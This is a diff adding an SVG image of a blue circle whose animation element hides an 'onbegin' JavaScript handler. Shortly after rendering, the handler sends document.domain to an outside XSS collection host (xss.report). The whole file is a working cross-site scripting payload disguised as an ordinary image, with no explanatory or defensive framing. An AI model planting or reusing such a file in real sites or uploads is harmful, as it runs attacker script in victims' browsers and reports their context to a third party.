@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <circle r="50" cx="100" cy="100" fill="blue">
+    <set begin="0.1s" attributeName="fill" to="red"
+         onbegin="new Image().src='https://xss.report/c/gomer12?d='+document.domain"/>
+  </circle>
+</svg>
